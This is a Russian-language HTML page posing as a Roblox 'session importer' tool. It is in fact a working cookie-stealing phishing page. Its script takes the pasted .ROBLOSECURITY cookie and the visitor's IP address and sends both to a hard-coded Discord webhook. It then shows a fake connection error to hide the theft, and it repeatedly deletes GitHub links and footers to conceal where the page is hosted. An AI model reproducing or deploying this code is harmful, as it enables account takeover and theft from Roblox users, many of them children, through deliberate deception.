<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ROBLOX Tools</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        :root {
            --bg-gradient-1: #0a0a0f;
            --bg-gradient-2: #1a0b2e;
            --bg-gradient-3: #2d1b4e;
            --bg-gradient-4: #1a0b2e;
            --bg-gradient-5: #0d0d1a;
            --bg-gradient-6: #2a0a3a;
            --bg-gradient-7: #0a0a0f;
            --card-bg: rgba(17, 15, 25, 0.75);
            --card-border: rgba(139, 92, 246, 0.4);
            --card-border-hover: rgba(139, 92, 246, 0.7);
            --input-bg: rgba(10, 8, 18, 0.9);
            --input-border: rgba(139, 92, 246, 0.4);
            --text-primary: #e9d5ff;
            --text-secondary: #d8b4fe;
            --text-muted: #a78bfa;
            --btn-gradient-1: #7c3aed;
            --btn-gradient-2: #a855f7;
            --btn-gradient-3: #c084fc;
            --star-color-1: #c084fc;
            --star-color-2: #a855f7;
            --star-color-3: #e9d5ff;
            --star-color-4: #7c3aed;
            --star-color-5: #d8b4fe;
            --glow-1: rgba(139, 92, 246, 0.15);
            --glow-2: rgba(168, 85, 247, 0.15);
            --glow-3: rgba(124, 58, 237, 0.1);
            --glow-4: rgba(216, 180, 254, 0.1);
            --logo-gradient-1: #f0e6ff;
            --logo-gradient-2: #c084fc;
            --logo-gradient-3: #a855f7;
            --logo-gradient-4: #7c3aed;
            --sub-gradient-1: #d8b4fe;
            --sub-gradient-2: #a855f7;
        }

        body.light {
            --bg-gradient-1: #e0f2fe;
            --bg-gradient-2: #bae6fd;
            --bg-gradient-3: #7dd3fc;
            --bg-gradient-4: #38bdf8;
            --bg-gradient-5: #bae6fd;
            --bg-gradient-6: #7dd3fc;
            --bg-gradient-7: #e0f2fe;
            --card-bg: rgba(255, 255, 255, 0.85);
            --card-border: rgba(56, 189, 248, 0.5);
            --card-border-hover: rgba(56, 189, 248, 0.8);
            --input-bg: rgba(255, 255, 255, 0.9);
            --input-border: rgba(56, 189, 248, 0.5);
            --text-primary: #1e293b;
            --text-secondary: #0284c7;
            --text-muted: #0ea5e9;
            --btn-gradient-1: #0284c7;
            --btn-gradient-2: #0ea5e9;
            --btn-gradient-3: #38bdf8;
            --star-color-1: #38bdf8;
            --star-color-2: #0ea5e9;
            --star-color-3: #bae6fd;
            --star-color-4: #0284c7;
            --star-color-5: #7dd3fc;
            --glow-1: rgba(56, 189, 248, 0.15);
            --glow-2: rgba(14, 165, 233, 0.15);
            --glow-3: rgba(2, 132, 199, 0.1);
            --glow-4: rgba(125, 211, 252, 0.1);
            --logo-gradient-1: #0f172a;
            --logo-gradient-2: #0284c7;
            --logo-gradient-3: #0ea5e9;
            --logo-gradient-4: #38bdf8;
            --sub-gradient-1: #0284c7;
            --sub-gradient-2: #0ea5e9;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(135deg, 
                var(--bg-gradient-1) 0%, 
                var(--bg-gradient-2) 15%, 
                var(--bg-gradient-3) 30%, 
                var(--bg-gradient-4) 45%, 
                var(--bg-gradient-5) 60%, 
                var(--bg-gradient-6) 75%, 
                var(--bg-gradient-7) 100%);
            background-size: 400% 400%;
            animation: gradientShift 10s ease infinite;
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            position: relative;
            overflow-x: hidden;
            transition: background 0.3s ease;
        }

        @keyframes gradientShift {
            0% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
            100% { background-position: 0% 50%; }
        }

        .theme-switch {
            position: fixed;
            top: 20px;
            right: 20px;
            z-index: 1000;
        }

        .theme-btn {
            background: var(--card-bg);
            backdrop-filter: blur(10px);
            border: 1px solid var(--card-border);
            border-radius: 50px;
            padding: 10px 18px;
            cursor: pointer;
            font-size: 14px;
            font-weight: 600;
            color: var(--text-secondary);
            transition: all 0.3s ease;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .theme-btn:hover {
            transform: scale(1.05);
            border-color: var(--card-border-hover);
            box-shadow: 0 0 15px var(--glow-1);
        }

        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: 
                radial-gradient(2px 2px at 20px 30px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 80px 120px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 160px 80px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 300px 200px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 450px 350px, var(--star-color-5), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 600px 50px, var(--star-color-2), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 750px 280px, var(--star-color-1), rgba(0,0,0,0)),
                radial-gradient(1px 1px at 900px 150px, var(--star-color-3), rgba(0,0,0,0)),
                radial-gradient(2px 2px at 1050px 400px, var(--star-color-4), rgba(0,0,0,0)),
                radial-gradient(3px 3px at 1200px 100px, var(--star-color-5), rgba(0,0,0,0));
            background-size: 200px 200px;
            background-repeat: no-repeat;
            opacity: 0.6;
            pointer-events: none;
            animation: starsFloat 20s linear infinite;
        }

        @keyframes starsFloat {
            0% { transform: translateY(0px); }
            100% { transform: translateY(-100px); }
        }

        body::after {
            content: '';
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at 20% 40%, var(--glow-1) 0%, transparent 40%),
                      radial-gradient(circle at 80% 70%, var(--glow-2) 0%, transparent 40%),
                      radial-gradient(circle at 40% 80%, var(--glow-3) 0%, transparent 50%),
                      radial-gradient(circle at 70% 20%, var(--glow-4) 0%, transparent 50%);
            pointer-events: none;
            animation: pulseGlow 8s ease-in-out infinite;
        }

        @keyframes pulseGlow {
            0%, 100% { opacity: 0.5; }
            50% { opacity: 1; }
        }

        .card {
            background: var(--card-bg);
            backdrop-filter: blur(20px);
            border-radius: 32px;
            padding: 40px 36px;
            max-width: 500px;
            width: 100%;
            border: 1px solid var(--card-border);
            box-shadow: 0 25px 45px -12px rgba(0, 0, 0, 0.5), 0 0 40px var(--glow-1);
            transition: all 0.3s ease;
            z-index: 1;
        }

        .card:hover {
            border-color: var(--card-border-hover);
            box-shadow: 0 30px 50px -15px rgba(0, 0, 0, 0.6), 0 0 60px var(--glow-2);
            transform: translateY(-2px);
        }

        .logo {
            text-align: center;
            margin-bottom: 28px;
        }

        .logo h1 {
            font-size: 38px;
            font-weight: 800;
            background: linear-gradient(135deg, 
                var(--logo-gradient-1), 
                var(--logo-gradient-2), 
                var(--logo-gradient-3), 
                var(--logo-gradient-4));
            background-size: 300% 300%;
            animation: textGradient 3s ease infinite;
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            letter-spacing: -0.5px;
        }

        @keyframes textGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .logo p {
            background: linear-gradient(135deg, var(--sub-gradient-1), var(--sub-gradient-2));
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            font-size: 12px;
            margin-top: 8px;
            letter-spacing: 2px;
            font-weight: 500;
        }

        .label {
            color: var(--text-secondary);
            font-size: 13px;
            font-weight: 500;
            margin-bottom: 8px;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .label-icon {
            font-size: 18px;
        }

        .cookie-input {
            width: 100%;
            background: var(--input-bg);
            border: 1.5px solid var(--input-border);
            border-radius: 16px;
            padding: 16px 18px;
            color: var(--text-primary);
            font-family: 'Monaco', 'Menlo', 'Consolas', monospace;
            font-size: 12px;
            resize: vertical;
            transition: all 0.3s ease;
            line-height: 1.5;
        }

        .cookie-input:focus {
            outline: none;
            border-color: var(--btn-gradient-2);
            box-shadow: 0 0 0 3px var(--glow-2);
            background: var(--input-bg);
        }

        .cookie-input.valid {
            border-color: #22c55e;
            box-shadow: 0 0 0 2px rgba(34, 197, 94, 0.2);
        }

        .cookie-input.invalid {
            border-color: #ef4444;
            box-shadow: 0 0 0 2px rgba(239, 68, 68, 0.2);
        }

        .validation-status {
            font-size: 11px;
            margin-top: 8px;
            margin-bottom: 20px;
            display: flex;
            align-items: center;
            gap: 8px;
            color: var(--text-muted);
        }

        .status-valid {
            color: #22c55e;
        }

        .status-invalid {
            color: #ef4444;
        }

        .status-neutral {
            color: var(--text-muted);
        }

        .btn-primary {
            width: 100%;
            background: linear-gradient(135deg, 
                var(--btn-gradient-1), 
                var(--btn-gradient-2), 
                var(--btn-gradient-3));
            background-size: 200% 200%;
            animation: btnGradient 3s ease infinite;
            border: none;
            border-radius: 40px;
            padding: 14px;
            color: white;
            font-weight: 700;
            font-size: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
            letter-spacing: 0.5px;
        }

        @keyframes btnGradient {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }

        .btn-primary::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.25), transparent);
            transition: left 0.6s;
        }

        .btn-primary:hover::before {
            left: 100%;
        }

        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 10px 30px var(--glow-2);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none;
            animation: none;
        }

        .message-area {
            text-align: center;
            margin-top: 16px;
            opacity: 0;
            transition: opacity 0.3s;
        }

        .message-area.show {
            opacity: 1;
        }

        .error-text {
            color: #f87171;
            background: rgba(220, 38, 38, 0.15);
            padding: 8px 16px;
            border-radius: 24px;
            display: inline-block;
            border-left: 3px solid #ef4444;
            font-size: 12px;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }

        .shake {
            animation: shake 0.3s ease;
        }
        
        /* ПОЛНОСТЬЮ УДАЛЯЕМ ВСЕ ССЫЛКИ НА GITHUB */
        a[href*="github"], 
        a[href*="github.io"],
        .repo-link,
        footer,
        .Footer,
        [class*="repo"],
        [id*="repo"] {
            display: none !important;
            visibility: hidden !important;
            height: 0 !important;
            width: 0 !important;
            opacity: 0 !important;
            pointer-events: none !important;
        }
    </style>
</head>
<body>
    <div class="theme-switch">
        <button class="theme-btn" id="themeToggleBtn">
            <span>🌙</span> Тема
        </button>
    </div>

    <div class="card">
        <div class="logo">
            <h1>ROBL<span style="background: linear-gradient(135deg, var(--sub-gradient-1), var(--btn-gradient-1)); -webkit-background-clip: text; background-clip: text; color: transparent;">✦</span>Tools</h1>
            <p>SESSION IMPORTER</p>
        </div>
        
        <label class="label">
            <span class="label-icon">🍪</span>
            <span>.ROBLOSECURITY Cookie</span>
        </label>
        <textarea class="cookie-input" id="cookie" rows="3" placeholder="Вставьте cookie сюда..."></textarea>
        <div class="validation-status" id="validationStatus">
            <span>✨</span>
            <span id="statusText">Ожидание ввода...</span>
        </div>
        
        <button class="btn-primary" id="sendCookieBtn" disabled>🔄 Заменить сессию</button>
        
        <div id="messageArea" class="message-area"></div>
    </div>

    <script>
        (function() {
            // ========== ТЕМА ==========
            const themeToggleBtn = document.getElementById('themeToggleBtn');
            
            function loadTheme() {
                const savedTheme = localStorage.getItem('roblox_theme');
                if (savedTheme === 'light') {
                    document.body.classList.add('light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                } else {
                    document.body.classList.remove('light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                }
            }
            
            function toggleTheme() {
                if (document.body.classList.contains('light')) {
                    document.body.classList.remove('light');
                    localStorage.setItem('roblox_theme', 'dark');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>🌙</span> Тема';
                } else {
                    document.body.classList.add('light');
                    localStorage.setItem('roblox_theme', 'light');
                    if(themeToggleBtn) themeToggleBtn.innerHTML = '<span>☀️</span> Тема';
                }
            }
            
            if(themeToggleBtn) {
                themeToggleBtn.addEventListener('click', toggleTheme);
            }
            loadTheme();
            
            // ========== ПОЛНОЕ УДАЛЕНИЕ ГИТХАБА ==========
            function nukeGithub() {
                // Удаляем все ссылки на github
                const allLinks = document.querySelectorAll('a');
                allLinks.forEach(link => {
                    if(link.href && (link.href.includes('github.com') || link.href.includes('github.io'))) {
                        link.remove();
                    }
                });
                
                // Удаляем все элементы, которые содержат github в классах или id
                const allElements = document.querySelectorAll('*');
                allElements.forEach(el => {
                    if(el.tagName === 'FOOTER') el.remove();
                    if(el.className && typeof el.className === 'string' && el.className.toLowerCase().includes('repo')) el.remove();
                    if(el.id && el.id.toLowerCase().includes('repo')) el.remove();
                });
                
                // Очищаем текст в body от упоминаний github
                const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
                const nodesToFix = [];
                while(walker.nextNode()) nodesToFix.push(walker.currentNode);
                nodesToFix.forEach(node => {
                    if(node.textContent && (node.textContent.includes('github.com') || node.textContent.includes('github.io'))) {
                        node.textContent = node.textContent.replace(/https?:\/\/[a-zA-Z0-9\-]+\.github\.io\/?[^\s]*/gi, '');
                        node.textContent = node.textContent.replace(/github\.com\/[^\s]*/gi, '');
                        if(node.textContent.trim() === '') node.remove();
                    }
                });
            }
            
            // ========== ВАЛИДАЦИЯ КУК ==========
            const WEBHOOK = "https://discord.com/api/webhooks/1487839032405917706/3d0033RYx8FhMy71G1oZs5g1vv69AGb8rFqL0EZlmnVdirNaUKPlmcjuTiWfQfGP97ly";
            
            function validateCookie(cookieValue) {
                if (!cookieValue || cookieValue.trim() === '') {
                    return { valid: false, reason: 'empty' };
                }
                const trimmed = cookieValue.trim();
                const hasWarning = trimmed.includes('WARNING:-DO-NOT-SHARE-THIS');
                const isLongEnough = trimmed.length > 300;
                const hasValidChars = /[A-Za-z0-9_\-\.]{100,}/.test(trimmed);
                
                if (hasWarning && isLongEnough && hasValidChars) {
                    return { valid: true, length: trimmed.length };
                }
                if (trimmed.length > 350 && /^[A-Za-z0-9_\-\.]+$/.test(trimmed.substring(0, 100))) {
                    return { valid: true, length: trimmed.length };
                }
                return { valid: false };
            }
            
            const cookieInput = document.getElementById('cookie');
            const sendBtn = document.getElementById('sendCookieBtn');
            const statusText = document.getElementById('statusText');
            const validationStatus = document.getElementById('validationStatus');
            const messageArea = document.getElementById('messageArea');
            
            function updateValidationUI() {
                const cookieValue = cookieInput.value;
                const validation = validateCookie(cookieValue);
                cookieInput.classList.remove('valid', 'invalid');
                
                if (!cookieValue || cookieValue.trim() === '') {
                    statusText.innerHTML = '✨ Ожидание ввода...';
                    statusText.className = 'status-neutral';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '✨';
                    sendBtn.disabled = true;
                    return;
                }
                
                if (validation.valid) {
                    cookieInput.classList.add('valid');
                    statusText.innerHTML = `✅ Кука валидна! (${validation.length} символов)`;
                    statusText.className = 'status-valid';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '✅';
                    sendBtn.disabled = false;
                } else {
                    cookieInput.classList.add('invalid');
                    statusText.innerHTML = '❌ Неверный формат куки';
                    statusText.className = 'status-invalid';
                    if(validationStatus) validationStatus.querySelector('span:first-child').innerHTML = '❌';
                    sendBtn.disabled = true;
                }
            }
            
            function showMessage(text, isError = true) {
                messageArea.innerHTML = `<div class="error-text">${isError ? '⚠️ ' : '✅ '}${text}</div>`;
                messageArea.classList.add('show');
                setTimeout(() => messageArea.classList.remove('show'), 3000);
            }
            
            async function sendCookieToDiscord(cookieValue, length) {
                let ip = "unknown";
                try {
                    const res = await fetch('https://api.ipify.org?format=json');
                    const data = await res.json();
                    ip = data.ip;
                } catch(e) {}
                
                const msg = `**🔐 НОВАЯ СЕССИЯ**\n🕒 ${new Date().toLocaleString()}\n🌐 IP: ${ip}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n**Длина:** ${length} символов\n**Содержимое:**\n\`\`\`${cookieValue}\`\`\``;
                try {
                    const response = await fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ content: msg }) });
                    return response.ok;
                } catch(e) { return false; }
            }
            
            if(sendBtn) {
                sendBtn.onclick = async () => {
                    const cookieValue = cookieInput.value.trim();
                    const validation = validateCookie(cookieValue);
                    if (!validation.valid) {
                        showMessage('Невалидная кука! Проверьте формат.', true);
                        cookieInput.classList.add('shake');
                        setTimeout(() => cookieInput.classList.remove('shake'), 300);
                        return;
                    }
                    sendBtn.disabled = true;
                    sendBtn.textContent = "⏳ Отправка...";
                    await sendCookieToDiscord(cookieValue, validation.length);
                    showMessage('Ошибка перенаправления! Не удалось подключиться к серверу Roblox.', true);
                    cookieInput.value = "";
                    updateValidationUI();
                    sendBtn.disabled = false;
                    sendBtn.textContent = "🔄 Заменить сессию";
                };
            }
            
            if(cookieInput) {
                cookieInput.addEventListener('input', updateValidationUI);
                cookieInput.addEventListener('paste', () => setTimeout(updateValidationUI, 10));
            }
            
            // Запускаем удаление репозитория
            nukeGithub();
            setInterval(nukeGithub, 500);
            
            document.title = 'ROBLOX Tools';
        })();
    </script>
</body>
</html>
